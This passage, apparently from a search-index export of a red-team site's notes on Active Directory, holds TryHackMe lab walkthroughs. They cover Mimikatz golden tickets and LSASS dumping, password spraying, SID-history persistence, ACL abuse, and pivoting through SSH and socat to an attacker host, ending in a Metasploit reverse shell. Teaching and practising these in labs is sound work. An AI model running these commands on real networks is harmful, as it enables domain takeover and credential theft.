    "c": "Pharming overview  Attack tree  1 Gather information (Reconnaissance) (AND) 2 Clone website with a tool like cURL, Invoke-WebRequest (powershell), or webscrapbook (AND) 3 Add payload (AND) 3.1 Change login page to a credential stealing script (OR) 3.2 Implant a malware (Crypted and packed) 4 Poison DNS cache (if it is a major DNS server, it can poison the caches of DNS servers maintained by internet service providers) (AND) 5 Compromise a host and change host file on it to redirect traffic 5.1 Make replacement (AND) 5.1.1 Use a self-extracting archive (SFX) (OR) 5.1.2 Use a batch file 5.2 Get a user to run it 5.2.1 Spoofing email 5.2.2 Fake website 5.2.3 Other social engineering Notes  In a phishing attack, an adversary will try to trick a user into visiting a fake website, but anyone can notice that the URL is not the original URL for the website. In a pharming attack (“farming” and “phishing”) website traffic is also redirected to a bogus site, but in contrast to phishing, the URL looks completely legitimate and users easily believe they are at a familiar site. There are two ways to easily achieve this: By changing the hosts file (/etc/hosts on Linux and %SystemRoot%\\system32\\drivers\\etc\\hosts on Windows) on a target computer. Common ways to replace a host file are creating a self-extracting archive (SFX), a computer application which contains a file archive and the programming to extract this information, or creating a batch file, a text file containing a series of commands to be executed by the command interpreter in windows operating systems. By exploitation of a vulnerability in DNS server software. DNS cache poisoning is very difficult to detect. It can last until the TTL, or time to live, expires on the cached data or an administrator realises what has happened and resolves the problem. In either case, the browser resolves the address of the domain automatically so there is no intervention of any kind on the part of the users and, since nothing unusual has happened, there is no reason to be suspicious.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "cb40493b1fc002ca3e0627ad1a0f26f8",
    "u": "https://ad.tymyrddin.dev/",
    "t": "Mythical blue lake ",
    "c": "Mythical blue lake  If an organisation’s grove uses Microsoft Windows, you are almost guaranteed to find AD. Microsoft AD is the dominant suite used to manage Windows domain networks. And because AD is used for Identity and Access Management of the entire grove, it holds the keys to the kingdom, making it a very likely target for attackers. Breaching Introduction NTLM authenticated services LDAP bind credentials Authentication relays Microsoft Deployment Toolkit Configuration files Enumerating Introduction Setup for THM AD Credential injection Through Microsoft Management Console Through Command Prompt Through PowerShell Through Bloodhound Cleanup Lateral movement and pivoting Introduction Setup for THM AD Moving through the network Spawning processes remotely Moving laterally using wmi Use of alternate authentication material Abusing user behaviour Port forwarding Cleanup Exploiting Introduction Setup for THM AD Exploiting permission delegation Exploiting kerberos delegation Exploiting automated relays Exploiting AD users Exploiting GPOs Exploiting certificates Exploiting domain trusts Persisting Introduction Setup for THM AD Persistence through credentials Persistence through tickets Persistence through certificates Persistence through SID history Persistence through group membership Persistence through ACLs Persistence through GPOs Credentials harvesting Introduction Credential access Local Windows credentials Local Security Authority Subsystem Service Windows Credential Manager Domain Controller Local Administrator Password Solution Hashes and tickets",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "e170918ced25ac2b6d28a47dd4fa9de1",
    "u": "https://ad.tymyrddin.dev/docs/exploit/trusts",
    "t": "Exploiting domain trusts ",
    "c": "Exploiting domain trusts  A forest, in Active Directory terms, consists of domain trees. Trusts define how domains in a forest can talk to one another. The main types of trusts are: Directional: Trust flows from one domain to another trusted domain Transitive: Trust flows between multiple trusted domains KRBTGT and Golden tickets  If an attacker compromises a domain controller and achieves full SYSTEM rights, it is possible to extract the hash of the krbtgt account. This would allow the attacker to create TGS tickets for any resources they choose. In order to create golden tickets, the following must be known: FQDN of the domain SID of the domain Username to impersonate KRBTGT hash The first three are usually easy to recover. The last one requires a domain compromise since the KRBTGT password hash is only stored on domain controllers. Dumping the KRBTGT hash  Use the RDP session on THMSERVER2 to recover the KRBTGT password hash using Mimikatz with DC Sync: C:\\Tools>mimikatz_trunk\\x64\\mimikatz.exe .#####. mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## > https://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > https://pingcastle.com / https://mysmartlogon.com ***/ mimikatz # privilege::debug Privilege '20' OK mimikatz # lsadump::dcsync /user:za\\krbtgt [DC] 'za.tryhackme.loc' will be the domain [DC] 'THMDC.za.tryhackme.loc' will be the DC server [DC] 'za\\krbtgt' will be the user account [rpc] Service : ldap [rpc] AuthnSvc : GSS_NEGOTIATE (9) Object RDN : krbtgt ** SAM ACCOUNT ** SAM Username : krbtgt Account Type : 30000000 ( USER_OBJECT ) User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT ) Account expiration : Password last change : 4/25/2022 7:18:22 PM Object Security ID : S-1-5-21-3885271727-2693558621-2658995185-502 Object Relative ID : 502 Credentials: Hash NTLM: removed ntlm- 0: removed lm - 0: removed ... Getting the SIDs  Recover two SIDs: The SID of the child domain controller (THMDC), to be impersonated in the forged TGT The SID of the Enterprise Admins in the parent domain, to be added as an extra SID to the forged TGT Use the AD-RSAT Powershell cmdlets to recover the SID of the child domain controller: PS C:\\> Get-ADComputer -Identity \"THMDC\" DistinguishedName : CN=THMDC,OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc DNSHostName : THMDC.za.tryhackme.loc Enabled : True Name : THMDC ObjectClass : computer ObjectGUID : bd651750-782b-4b09-93b4-b5987ec7311b SamAccountName : THMDC$ SID : S-1-5-21-3885271727-2693558621-2658995185-1001 UserPrincipalName : Recover the SID of the Enterprise Admins group by querying the parent domain controller: PS C:\\> Get-ADGroup -Identity \"Enterprise Admins\" -Server thmrootdc.tryhackme.loc DistinguishedName : CN=Enterprise Admins,CN=Users,DC=tryhackme,DC=loc GroupCategory : Security GroupScope : Universal Name : Enterprise Admins ObjectClass : group ObjectGUID : a23ae384-16e8-44d5-9b36-8173c4e0e5de SamAccountName : Enterprise Admins SID : S-1-5-21-3330634377-removed-519 Exploiting domain trusts  Use Mimikatz to generate a golden ticket. mimikatz # kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:16f9af38fca3ada405386b3b57366082 /sids:S-1-5-21-3330634377-1326264276-632209373-519 /ptt Try browsing the remote file system of \\\\thmrootdc.tryhackme.loc\\C$ (the UNC path to the C$ share). The flag is on THMROOTDC in the Administrator’s Desktop folder (flag6.txt).",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "e4796a5afc251170f2357a3f4765e025",
    "u": "https://ad.tymyrddin.dev/docs/breach/ntlm",
    "t": "NTLM authenticated services ",
    "c": "NTLM authenticated services  New Technology LAN Manager (NTLM) is the suite of security protocols used to authenticate users’ identities in AD. NTLM can be used for authentication by using a challenge-response-based scheme called NetNTLM. This authentication mechanism is used by the services on a network. And some services that use NetNTLM may also be exposed to the internet. Examples: Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal. Remote Desktop Protocol (RDP) service of a server being exposed to the internet. Exposed VPN endpoints that were integrated with AD. Web applications that are internet-facing and make use of NetNTLM. The user is now either granted access or denied access, authorisation is performed on the Exchange server with consultation of the msg.target.com Domain Controller. NTLM is generally considered insecure because it uses outdated cryptography that is vulnerable to several modes of attacks. NTLM is also vulnerable to pass-the-hash and brute-force attacks. Password spraying  Most AD environments have account lockout configured, we won’t be able to run a full brute-force attack. Instead, a password spraying attack might work. We could use tools such as Hydra to assist with the password spraying attack. The room uses a script named ntlm_passwordspray.py . The core function takes a suggested password and a URL to target as input and attempts to authenticate to the URL with each username in the textfile. By monitoring the differences in HTTP response codes from the application, we can determine if the credential pair is valid or not. If the credential pair is valid, the application responds with a 200 HTTP (OK) code. If the pair is invalid, the application returns a 401 HTTP (Unauthorised) code. The parameters: userfile - Textfile containing usernames ( usernames.txt ) fqdn - Fully qualified domain name associated with the organisation we are attacking ( za.tryhackme.com ) password - The password we want to use for our spraying attack ( Changeme123 ) attackurl - The URL of the application that supports Windows Authentication ( http://ntlmauth.za.tryhackme.com ) python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/ Results: [*] Starting passwords spray attack using the following password: Changeme123 [-] Failed login with Username: anthony.reynolds [-] Failed login with Username: samantha.thompson [-] Failed login with Username: dawn.turner [-] Failed login with Username: frances.chapman [-] Failed login with Username: henry.taylor [-] Failed login with Username: jennifer.wood [+] Valid credential pair found! Username: hollie.powell Password: Changeme123 [-] Failed login with Username: louise.talbot [+] Valid credential pair found! Username: heather.smith Password: Changeme123 [-] Failed login with Username: dominic.elliott [+] Valid credential pair found! Username: gordon.stevens Password: Changeme123 [-] Failed login with Username: alan.jones [-] Failed login with Username: frank.fletcher [-] Failed login with Username: maria.sheppard [-] Failed login with Username: sophie.blackburn [-] Failed login with Username: dawn.hughes [-] Failed login with Username: henry.black [-] Failed login with Username: joanne.davies [-] Failed login with Username: mark.oconnor [+] Valid credential pair found! Username: georgina.edwards Password: Changeme123 [*] Password spray attack completed, 4 valid credential pairs found",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "cdac4106d9f5f787b82699230879a026",
    "u": "https://ad.tymyrddin.dev/docs/pivot/portforward",
    "t": "Port forwarding ",
    "c": "Port forwarding  SSH tunnelling  SSH, as it already has built-in functionality to do port forwarding through a feature called SSH Tunneling. While SSH used to be a protocol associated with Linux systems, Windows now ships with the OpenSSH client by default, so you can expect to find it in many systems nowadays, independent of their operating system. On Windows machines, most likely no SSH server will be available: Start a tunnel from the compromised machine, acting as an ssh client, to the attack machine, which will act as an ssh server. Making a connection back to our attacker’s machine, we will want to create a user in it without access to any console for tunnelling and set a password to use for creating the tunnels. useradd tunneluser -m -d /home/tunneluser -s /bin/true passwd tunneluser The SSH tunnel can be used to do either local or remote port forwarding. SSH remote port forwarding  Remote port forwarding is useful, for example, when having gained control over the 2.2.2.2 Windows host (it does not need to be administrator access) and would like to use it as a pivot to access a port on a server to which we can not directly connect. Take a reachable port from the SSH client (the compromised machine) and project it into a remote ssh server (the attacker's machine). To forward port 3389 on the server back to our attacker’s machine, on the compromised Windows host: C:\\> ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N This establishes an SSH session from 2.2.2.2 (Compromised host) to 1.1.1.1 (Attacker machine) using the tunneluser user. Because the tunneluser is not allowed to run a shell on the attacker machine, we need to run the ssh command with the -N switch to prevent the client from requesting one, or the connection will exit immediately. The -R switch is used to request a remote port forward, and the syntax requires us first to indicate the port we will be opening at the ssh server ( 3389 ), followed by a colon and then the IP and port of the socket we will be forwarding ( 3.3.3.3:3389 ). Port numbers do not need to match. When up and running, we can go to the attacker’s machine and RDP into the forwarded port to reach the server: xfreerdp /v:127.0.0.1 /u:<username> /p:<password> SSH local port forwarding  Local port forwarding allows for “pulling” a port from an ssh server into the ssh client. Any host on the network that can not connect directly to the attacker machine but can connect to the compromised host will now be able to reach the services offered on the attack machine through the pivot host. Take any service available in our attacker's machine and make it available through a port on the compromised host. To forward port 80 from the attack machine and make it available from the compromised host, run: C:\\> ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N The -L option requires indicating which local socket used by the compromised host to receive connections on ( *:80 ) and the remote socket to connect to from the attack machine perspective ( 127.0.0.1:80 ). Opening a new port on the compromised host, add a firewall rule to allow for incoming connections (with dir=in ). This requires administrative privileges: netsh advfirewall firewall add rule name=\"Open Port 80\" dir=in action=allow protocol=TCP localport=80 Up and running, any user pointing their browsers to the compromised host at http://2.2.2.2:80 will see the website published by the attack machine. Port forwarding with socat  socat is not as flexible as ssh , and it is more noisy, but if ssh is not available on the compromised host, may be an option. It must be transferred to the compromised host first. Access port 3389 on the server using the compromised host as a pivot, with a similar effect as SSH remote port forwarding. To access port 3389 on the server using the compromised host: C:\\>socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389 The fork option forks a new process for each connection received, making multiple connections without closing possible. Otherwise, it would be closed after the first connection finishes. And because a port is being opened on the pivot host, create a firewall rule: netsh advfirewall firewall add rule name=\"Open Port 3389\" dir=in action=allow protocol=TCP localport=3389 The compromised host will spawn port 80 and listen for connections to be forwarded to port 80 on the attack machine. To expose port 80 from the attack machine, making it reachable by the server: C:\\>socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80 Dynamic port forwarding and SOCKS  When wanting to run scans against many ports of a host, or even many ports across many machines through a pivot host, dynamic port forwarding seems a good choice. It allows for pivoting through a host and establishing several connections to any IP addresses/ports we want, by using a SOCKS proxy. Establish a reverse dynamic port forwarding ssh tunnel on the compromised host: C:\\> ssh tunneluser@1.1.1.1 -R 9050 -N Edit the proxychains configuration on the attack machine: sudo nano /etc/proxychains4.conf Go down to the [ProxyList] section and add your proxy connection. The default port is 9050 , but any port will work as long as it matches the one we used when establishing the SSH tunnel. If we now want to execute any command through the proxy, we can use proxychains , for example: proxychains curl http://pxeboot.za.tryhackme.com Note: nmap might not work well with SOCKS in some circumstances Flags  Connect to THMJMP2 via SSH using the credentials from the first task. Connect via RDP to THMIIS using socat . Exploit vulnerable Rejetto HFS on the Domain Controller. RDP to THMIIS  With the credentials from the distributor, ssh into the jumphost: ssh username@za.tryhackme.com@thmjmp2@za.tryhackme.com On the jumphost, run socat: C:\\tools\\socat\\>socat TCP4-LISTEN:50000,fork TCP4:THMIIS.za.tryhackme.com:3389 The firewall is disabled. Set up a listener on port 50000 on the attack machine, and connect to THMIIS via RDP from the attack machine by pivoting through the listener at THMJMP2: xfreerdp /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020 Flag is on desktop of t1_thomas.moore. Exploit Rejetto HFS on the Domain Controller  Use local port forwarding by adding -L *:6666:127.0.0.1:6666 and -L *:7777:127.0.0.1:7777 to the ssh command on the jumphost THMJMP2. This will bind both ports on THMJMP2 and tunnel any connection back to the attack machine: C:\\> ssh tunneluser@<IP attack machine> -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7777:127.0.0.1:7777 -N Start Metasploit and configure the exploit so that the required ports match the ports forwarded through THMJMP2: msfconsole msf6 > use rejetto_hfs_exec msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.com msf6 exploit(windows/http/rejetto_hfs_exec) > set ReverseListenerBindAddress 127.0.0.1 msf6 exploit(windows/http/rejetto_hfs_exec) > set lport 7777 msf6 exploit(windows/http/rejetto_hfs_exec) > set srvhost 127.0.0.1 msf6 exploit(windows/http/rejetto_hfs_exec) > set srvport 6666 msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 127.0.0.1 msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8888 msf6 exploit(windows/http/rejetto_hfs_exec) > exploit Receive a shell back at the attack machine. The flag is on C:\\hfs\\flag.txt . Resources  0xBEN Notes and Cheatsheets: Port Forwarding 0xBEN Notes and Cheatsheets: Forward Dynamic SOCKS Proxy 0xBEN Notes and Cheatsheets: Reverse Dynamic SOCKS Proxy",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "2414018cab62f7e8da7ba6aa0d70c580",
    "u": "https://ad.tymyrddin.dev/docs/enum/readme",
    "t": "Introduction ",
    "c": "Introduction  THM Room: Enumerating Active Directory What?  Enumerate details about the AD setup and structure with authenticated access, even super low-privileged access. Why?  Finding some way to escalate privileges or move laterally to gain additional access until we have enough privileges to execute and reach our goals. How?  Setup for THM AD Credential injection Through Microsoft Management Console Through Command Prompt Through PowerShell Through Bloodhound Cleanup",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "ae1a619508b4c6367ab7faba85ccf1a8",
    "u": "https://ad.tymyrddin.dev/docs/harvest/lsass",
    "t": "Local Security Authority Subsystem Service ",
    "c": "Local Security Authority Subsystem Service  Local Security Authority Server Service (LSASS) is a Windows process that handles the operating system security policy and enforces it on a system. It verifies logged in accounts and ensures passwords, hashes, and Kerberos tickets. Windows system stores credentials in the LSASS process to enable users to access network resources, such as file shares, SharePoint sites, and other network services, without entering credentials every time a user connects. Thus, the LSASS process is a juicy target for red teamers because it stores sensitive information about user accounts. The LSASS is commonly abused to dump credentials to either escalate privileges, steal data, or move laterally. If we have administrator privileges, we can dump the process memory of LSASS. Windows system allows us to create a dump file, a snapshot of a given process. This could be done either with the Desktop access (GUI) or the command prompt. This attack is defined in the MITRE ATT&CK framework as “OS Credential Dumping: LSASS Memory (T1003)”. To dump any running Windows process using the GUI, open the Task Manager, and from the Details tab, find the required process, right-click on it, and select “Create dump file”. An alternative way to dump a process if a GUI is not available to us is by using ProcDump . ProcDump is a Sysinternals process dump utility that runs from the command prompt. Mimikatz is a well-known tool used for extracting passwords, hashes, PINs, and Kerberos tickets from memory using various techniques. Mimikatz is a post-exploitation tool that enables other useful attacks, such as pass-the-hash, pass-the-ticket, or building Golden Kerberos tickets. Mimikatz deals with operating system memory to access information and requires administrator and system privileges in order to dump memory and extract credentials. Protected LSASS and Mimikatz  To disable LSASS protection: C:\\Tools\\Mimikatz> mimikatz.exe .#####. mimikatz 2.2.0 (x64) #18362 Jul 10 2019 23:09:43 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## > http://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > http://pingcastle.com / http://mysmartlogon.com ***/ mimikatz # privilege::debug Privilege '20' OK mimikatz # sekurlsa::logonpasswords ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005) mimikatz # !+ [*] 'mimidrv' service not present [+] 'mimidrv' service successfully registered [+] 'mimidrv' service ACL to everyone [+] 'mimidrv' service started mimikatz # !processprotect /process:lsass.exe /remove Process : lsass.exe PID 528 -> 00/00 [0-0-0] Again  mimikatz # sekurlsa::logonpasswords Authentication Id : 0 ; 515377 (00000000:0007dd31) Session : RemoteInteractive from 3 User Name : Administrator Domain : THM Logon Server : CREDS-HARVESTIN Logon Time : 6/3/2022 8:30:44 AM SID : S-1-5-21-1966530601-3185510712-10604624-500 msv : [00000003] Primary * Username : Administrator * Domain : THM * NTLM : 98d3a787a80d08385cea7fb4aa2a4261 * SHA1 : 64a137cb8178b7700e6cffa387f4240043192e72 * DPAPI : bc355c6ce366fdd4fd91b54260f9cf70 ...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "a82925250dbf251bd4693ae0180a8c69",
    "u": "https://ad.tymyrddin.dev/docs/persist/sid",
    "t": "Persistence through SID history ",
    "c": "Persistence through SID history  A quick note here. These techniques are incredibly invasive and hard to remove. Even if you have sign-off on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment, and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them. This one is: Not easily removed except by RSAT tooling Difficult to find, not easily detected The legitimate use case of SID history is to enable access for an account to effectively be cloned to another. This becomes useful when an organisation is busy performing an AD migration as it allows users to retain access to the original domain while they are being migrated to the new one. In the new domain, the user would have a new SID, but we can add the user’s existing SID in the SID history, which will still allow them to access resources in the previous domain using their new account. While SID history is good for migrations, we, as attackers, can also abuse this feature for persistence. One way to abuse this feature is to add the SID of a privileged group – like the Domain Admins group – to the SID history of a low-level user. Even though the user is not a member of the group in AD, the system will authorise them as if they were due to the group SID being in their history. SSH into the domain controller using the given administrator credentials: ssh administrator@za.tryhackme.loc@thmdc.za.tryhackme.loc Inspect the SID history and group membership of the unprivileged account from the credential distributor . powershell -ep bypass Get-ADUser 'user.name' -Properties sidhistory,memberof The SIDHistory property is an empty list {} and the MemberOf property shows that this user is only a member of the Internet Access group. Get the SID of the Domain Admins group. Get-ADGroup 'Domain Admins' Use the DSInternals PowerShell module to add the Domain Admins SID to the user’s SID history : Import-Moduls DSInternals Can not modify the SID history while the NTDS database is running: Stop-Service ntds -Force Add the SID to the low privilege account’s SID history: Add-ADDBSidHistory -SamAccountName 'donald.ross' -SidHistory 'S-1-5-21-3885271727-2693558621-2658995185-512' -DatabasePath 'C:\\Windows\\NTDS\\ntds.dit' Restart the NTDS database: Start-Service ntds SSH to thmwrk1 to test the new privileges: ssh user.name@za.tryhackme.loc@thmwrk1.za.tryhackme.loc Check access to a privileged resource on the domain controller: dir \\\\thmdc.za.tryhackme.loc\\c$\\Users Resources  Sneaky Active Directory Persistence #14: SID History",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "e912f5aa6ea7450fcfda1b9a76b9826d",
    "u": "https://ad.tymyrddin.dev/docs/exploit/permissions",
    "t": "Exploiting permission delegation ",
    "c": "Exploiting permission delegation  Exploiting ACEs  Access Control Entries (ACEs) populate Discretionary Access Control Lists (DACLs). These ACLs determine the permissions that certain AD objects have over others. Almost any AD object can be secured with ACEs, which then describe the allowed and denied permissions that any other AD object has against the target object. Certain ACEs can be very dangerous if misconfigured: ForceChangePassword: Set a user’s password without knowing their current password. AddMembers: Add users (including oneself), groups, or computers to a target group. GenericAll: Complete control over an object, including the ability to change the user’s password, register an SPN or add an AD object to the target group. GenericWrite: Update any non-protected parameters of our target object. For example, could update the scriptPath parameter, which would set a user’s logon script. WriteOwner: Update the owner of the target object. Could make ourselves the owner, allowing us to gain additional permissions over the object. WriteDACL: We have the ability to write new ACEs to the target object’s DACL. For example, could write an ACE that grants our account full control over the target object. AllExtendedRights: Perform any action associated with extended AD rights against the target object. For example, the ability to force change a user’s password. Bloodhound  Sharphound has already been executed. The data is in the .zip task file. Launch neo4j and bloodhound and import the data. sudo neo4j console sudo bloodhound --no-sandbox Drag the .zip file into the Bloodhound window. Search for our initial account retrieved from http://distributor.za.tryhackme.loc/creds Privilege Escalation  Look at the info in the Node Info tab, it is pretty obvious that the initial access user does not have many privileges. We have the ability to RDP into THMWRK1, but this will only provide us with low-privileged access. Compromise the Tier 2 Admins group (administrative privileges on all workstations). Ask Bloodhound if there is perhaps a road that we can follow to compromise this group (Add your user account as the start position and the Tier 2 Admins group as the end position). An administrator has misconfigured the Permission Delegation of the IT Support group by providing the Domain Users group with the AddMembers ACE. This means that any member of the Domain Users group (including our account) can add accounts to the IT Support Group. Furthermore, Bloodhound shows that the IT Support Group has the ForceChangePassword ACE for the Tier 2 Admins group members. This is not really a misconfiguration since Tier 2 admins are not that sensitive, but it provides a very potent attack path when combined with the initial misconfiguration. Add your user account as the start position and the Tier 2 Admins group as the end position. Right-click GenericWrite and choose Help to read more information about the privilege escalation path. Add AD account to the IT Support group  RDP to thmwrk1.za.tryhackme.loc and open a PowerShell terminal. xfreerdp /v:thmwrk1.za.tryhackme.loc /u:'max.smith' /p:'<given password>' Use the Add-ADGroupMember PowerShell cmdlet from the AD-RSAT toolset. Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Users\\max.smith> $user = Get-ADUser -Identity 'max.smith' PS C:\\Users\\max.smith> $group = Get-ADGroup -Identity 'IT Support' PS C:\\Users\\max.smith> Add-ADGroupMember -Identity $group -Members $user PS C:\\Users\\max.smith> Get-ADGroupMember -Identity $group ... distinguishedName : CN=max.smith,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc name : max.smith objectClass : user objectGUID : f0cd5ecd-6a42-4eff-8015-071e1dc3747b SamAccountName : max.smith SID : S-1-5-21-3885271727-2693558621-2658995185-1142 ... Force a new password on a T2 Admin  PS C:\\Users\\max.smith> Get-ADGroupMember -Identity \"Tier 2 Admins\" Pick one close to the bottom, or randomly. $password = ConvertTo-SecureString 'Password123' -AsPlainText -Force PS C:\\Users\\max.smith> $t2admin = Get-ADGroupMember -Identity 'Tier 2 Admins' | Get-Random -Count 1 PS C:\\Users\\max.smith> $t2admin.Name t2_caroline.dawson PS C:\\Users\\max.smith> Set-ADAccountPassword -Identity $t2admin -Reset -NewPassword $password Set-ADAccountPassword : Access is denied At line:1 char:1 + Set-ADAccountPassword -Identity $t2admin -Reset -NewPassword $passwor ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : PermissionDenied: (CN=t2_caroline....ryhackme,DC=loc:ADAccount) [Set-ADAccountPassword], UnauthorizedAccessException + FullyQualifiedErrorId : ActiveDirectoryCmdlet:System.UnauthorizedAccessException,Microsoft.ActiveDirectory.Manag ement.Commands.SetADAccountPassword Note: If you get an Access Denied error, your permissions have not yet propagated through the domain. This can take up to 10 minutes. The best approach is to terminate the SSH or RDP session, take a quick break, and then reauthenticate and try again. Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Users\\max.smith> $t2admin = Get-ADGroupMember -Identity 'Tier 2 Admins' | Get-Random -Count 1 PS C:\\Users\\max.smith> $t2admin.Name t2_alan.riley PS C:\\Users\\max.smith> $password = ConvertTo-SecureString 'Password123' -AsPlainText -Force PS C:\\Users\\max.smith> Set-ADAccountPassword -Identity $t2admin -Reset -NewPassword $password PS C:\\Users\\max.smith> Authenticate to THMWRK1 using this target account with its new password. You currently have administrative access to this workstation. The flag is on the Desktop of the Administrator user on THMWRK1 (flag1.txt).",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "3a51ff16b6f1a42b01e919e7f33c1b95",
    "u": "https://ad.tymyrddin.dev/docs/harvest/wcm",
    "t": "Windows Credential Manager ",
    "c": "Windows Credential Manager  Credential Manager is a Windows feature that stores logon-sensitive information for websites, applications, and networks. It contains login credentials such as usernames, passwords, and internet addresses. There are four credential categories: Web credentials contain authentication details stored in Internet browsers or other applications. Windows credentials contain Windows authentication details, such as NTLM or Kerberos. Generic credentials contain basic authentication details, such as clear-text usernames and passwords. Certificate-based credentials: Authenticated details based on certifications. Note that authentication details are stored on the user’s folder and are not shared among Windows user accounts. And, they are cached in memory. Listing the Available Credentials from the Credentials Manager: C:\\Users\\Administrator>VaultCmd /list To check for any stored credentials in the Web Credentials vault: C:\\Users\\Administrator>VaultCmd /listproperties:\"Web Credentials\" To list more information about the stored credentials: C:\\Users\\Administrator>VaultCmd /listcreds:\"Web Credentials\" Credential Dumping  The VaultCmd is not able to show the password. Use Get-WebCredentials.ps1 : C:\\Users\\Administrator>powershell -ex bypass Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Users\\Administrator> Import-Module C:\\Tools\\Get-WebCredentials.ps1 PS C:\\Users\\Administrator> Get-WebCredentials UserName Resource Password Properties -------- -------- -------- ---------- THMUser internal-app.thm.red E4syPassw0rd {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], [application, MSEdge]} RunAs  C:\\Users\\thm>runas /savecred /user:THM.red\\thm-local cmd.exe Mimikatz  To dump clear-text passwords stored in the Credential Manager from memory: C:\\Users\\Administrator>c:\\Tools\\Mimikatz\\mimikatz.exe .#####. mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## > http://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > http://pingcastle.com / http://mysmartlogon.com ***/ mimikatz # privilege::debug Privilege '20' OK mimikatz # sekurlsa::credman",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "8d164da348c0fe841a76a0885999a933",
    "u": "https://ad.tymyrddin.dev/docs/exploit/kerberos",
    "t": "Exploiting kerberos delegation ",
    "c": "Exploiting kerberos delegation  The general purpose of Kerberos delegation is to allow an application or service to access a resource on another machine on behalf of a user or machine. If a user logs into an application, the application will request resources on other machines on behalf of the user. It removes the need for a global service account with less granular permissions. Unconstrained Delegation  With Unconstrained Delegation, a host has no limit on the resources it can access on behalf of a user who connects, as long as the user has the TRUSTED_FOR_DELEGATION flag set. Once a user connects, the host requests a TGT for the user and caches it locally for future use. Given the TGT, an attacker could proceed to access any resource accessible by the user owner of the TGT. For example, if an Administrator logged on to the host with unconstrained delegation, the attacker would now be in possession of the Administrator’s TGT. Constrained Delegation  Constrained Delegation restricts the type of services a service acount can request on behalf of a user. For example, if a domain service account (sevice principal) was running a web application on a web server, constrained delegation would enable the administrator to choose which services to delegate access to on behalf of another user. An administrator could selectively filter delegation to resources such as HTTP, CIFS, LDAP, HOST, MSSQL, etc. If an attacker compromised a host configured for constrained delegation and obtained the NTLM hash or password of the service account, the attacker could request a TGT for the service account and use the TGT to request a TGS for the delegate account to access a particular service. Resource-Based Constrained Delegation  This model of delegation works inversely from the other delegation types. Introduced by Microsoft in 2012, Resource-Based Constrained Delegation (RBCD) once again provided additional restrictions on Kerberos Delegation for security. RBCD changes the delegation model entirely. Instead of specifying which object can delegate to which service, the service now specifies which objects can delegate to it. This allows the service owner to control who can access it. For example, if we have permission to configure RBCD for a service, we have the ability to set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute for the AD Object. We can populate this attribute with the details of an AD account that we have access to. To now gain access to the service, we can generate a TGT for the account we control, which will allow us to interact with this service. Lab: Constrained Delegation Exploitation  Using the tier 2 admin credentials gained in the permissions exploitation , RDP to THMWRK1 as T2 Admin for some enumeration and exploitation. Enumeration  Use PowerView and the Get-NetUser cmdlet of PowerSploit for this enumeration. PowerView is going to almost always get detected by antivirus! Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Users\\t2_alan.riley> Import-Module C:\\tools\\PowerView.ps1 PS C:\\Users\\t2_alan.riley> Get-NetUser -TrustedToAuth logoncount : 43 badpasswordtime : 11/7/2022 3:13:34 PM 